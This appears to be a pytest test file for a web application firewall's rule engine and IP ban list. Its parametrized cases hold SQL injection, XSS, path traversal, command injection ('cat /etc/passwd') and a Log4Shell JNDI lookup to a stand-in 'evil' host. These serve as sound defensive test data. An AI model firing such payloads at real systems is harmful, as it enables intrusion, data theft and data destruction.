import json
import sys
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

import pytest

import rules
from bans import BanList, BanRefused

H = {"user-agent": "Mozilla/5.0", "content-type": "application/json"}


def blocked(path="/api/x", query="", headers=None, body=b""):
    score, hits = rules.inspect(path, query, {**H, **(headers or {})}, body)
    return rules.should_block(score), hits


# ---------------------------------------------------------------- attaques à bloquer
@pytest.mark.parametrize("query", [
    "q=1' UNION SELECT username,password FROM users--",
    "q=1%27%20UNION%20SELECT%20NULL",                       # encodé
    "q=1%2527%2520UNION%2520SELECT%2520NULL",               # double encodage
    "q=1' OR '1'='1",
    "id=1 OR 1=1",
    "q=1;SELECT pg_sleep(5)",
    "q=x'; DROP TABLE users;--",
    "q=UNION/**/SELECT/**/1",                               # commentaires SQL
    "q=select * from information_schema.tables",
    "q=<script>alert(1)</script>",
    "q=%3Cscript%3Ealert(1)%3C/script%3E",
    "q=<img src=x onerror=alert(1)>",
    "q=javascript:alert(1)",
    "file=../../../../etc/passwd",
    "file=%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "cmd=;cat /etc/passwd",
    "x=${jndi:ldap://evil/a}",
])
def test_attacks_in_query_are_blocked(query):
    assert blocked(query=query)[0], query


def test_sqli_in_json_body_is_blocked():
    body = json.dumps({"from": "ACC-DEMO-1' OR '1'='1", "to": "ACC-DEMO-2", "amount": "1"}).encode()
    assert blocked("/api/payments", body=body)[0]


def test_scanner_user_agent_is_blocked():
    assert blocked(headers={"user-agent": "sqlmap/1.7"})[0]


# ---------------------------------------------------------------- trafic légitime à laisser passer
@pytest.mark.parametrize("path,query,body", [
    ("/api/fees/quote", "amount=100", b""),
    ("/api/payments", "limit=10", b""),
    ("/auth/token", "", json.dumps({"username": "demo-user", "password": "p@ss' OR 1=1 --w0rd"}).encode()),  # password jamais inspecté
    ("/api/payments", "", json.dumps({"from": "ACC-DEMO-1", "to": "ACC-DEMO-2", "amount": "12.50", "idempotency_key": "k-1"}).encode()),
    ("/", "", b""),
    ("/assets/index-abc123.js", "", b""),
    ("/api/payments", "q=o'brien", b""),                      # apostrophe dans un nom
    ("/api/payments", "note=please+select+one+union+of+items", b""),
])
def test_legit_requests_pass(path, query, body):
    is_blocked, hits = blocked(path, query, body=body)
    assert not is_blocked, hits


# ---------------------------------------------------------------- bans
def test_ban_and_expiry(tmp_path):
    b = BanList(str(tmp_path / "bans.json"), never_ban=["192.168.137.1"])
    b.ban("192.168.137.20", 1, "flood")
    assert b.is_banned("192.168.137.20")
    time.sleep(1.1)
    assert not b.is_banned("192.168.137.20")


def test_ban_persists_across_restart(tmp_path):
    p = str(tmp_path / "bans.json")
    BanList(p).ban("10.0.0.5", 60, "x")
    assert BanList(p).is_banned("10.0.0.5")


@pytest.mark.parametrize("ip", ["192.168.137.1", "127.0.0.1", "0.0.0.0", "224.0.0.1", "10.0.0.0/8", "not-an-ip", "192.168.0.0/16"])
def test_ban_refuses_dangerous_targets(tmp_path, ip):
    b = BanList(str(tmp_path / "b.json"), never_ban=["192.168.137.1"])
    with pytest.raises(BanRefused):
        b.ban(ip, 60, "x")


def test_ban_caps(tmp_path):
    b = BanList(str(tmp_path / "b.json"), max_ttl=100, max_active=2)
    assert b.ban("10.0.0.1", 99999, "x")["ttl"] == 100
    b.ban("10.0.0.2", 10, "x")
    with pytest.raises(BanRefused):
        b.ban("10.0.0.3", 10, "x")
